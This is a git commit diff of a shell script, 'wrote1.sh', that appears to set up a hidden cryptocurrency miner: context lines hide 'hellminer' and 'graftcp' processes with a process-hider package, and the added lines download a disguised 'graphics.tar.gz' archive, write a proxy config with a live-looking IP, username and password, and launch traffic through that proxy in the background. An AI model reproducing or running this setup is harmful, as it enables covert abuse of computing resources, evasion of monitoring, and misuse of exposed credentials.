035dd33d7d89c9a0e3433eaff3b422d9f03c83b8
thefacta <106053479+thefacta@users.noreply.github.com>
2022-05-23 15:31:16 +0700

    Update wrote1.sh

--- wrote1.sh
+++ wrote1.sh
@@ -7,3 +7,27 @@ npm i -g node-process-hider
 
 ph add graftcp
 ph add hellminer
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 181.215.184.109:45786
+socks5_username = Selshindeparshuram2012
+socks5_password = V7p9BkV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
